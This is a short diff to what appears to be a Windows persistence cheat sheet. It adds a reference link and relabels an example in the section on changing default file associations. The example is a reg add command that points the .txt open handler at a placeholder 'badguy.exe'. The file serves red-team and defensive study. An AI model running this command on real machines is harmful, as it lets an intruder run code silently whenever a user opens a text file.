@@ -298,7 +298,9 @@ User can see malicious string in reg **HKLM**
 
 ## Change default file association 
 
-#### Example (txt):
+*refer: https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/*
+
+#### Example (txt,simple way):
 ```powershell
 reg add "HKEY_CLASSES_ROOT\textfile\shell\open\command" /v (Default) /t REG_SZ /d "C:\path\to\badguy.exe"
 ```
